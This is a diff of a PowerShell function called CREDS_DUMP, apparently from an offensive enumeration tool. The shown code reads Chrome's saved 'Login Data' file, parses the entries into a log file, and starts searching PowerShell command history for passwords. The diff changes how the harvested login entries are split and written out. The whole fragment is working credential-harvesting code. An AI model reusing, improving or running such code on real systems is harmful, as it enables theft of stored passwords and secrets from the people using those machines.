@@ -704,8 +704,8 @@ function CREDS_DUMP {
 
     ## Retrieve Chrome Credentials (plain text)
     echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
-    echo "`nEnumerating LogIn Data" >> $LogFilePath\BrowserEnum.log
-    echo "----------------------" >> $LogFilePath\BrowserEnum.log
+    echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
+    echo "------------------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
         echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
     }else{
@@ -715,11 +715,12 @@ function CREDS_DUMP {
         }else{
             ForEach ($Key in $Json){
                 $Regex = $Key -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
-                echo "`n" $Regex >> $LogFilePath\BrowserEnum.log
+                $ParseData = $Regex.Split('/')[2]
+                echo $ParseData >> $LogFilePath\BrowserEnum.log
             }
        }
     }
-
+    
     ## Search for passwords in { ConsoleHost_history }
     If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
         echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
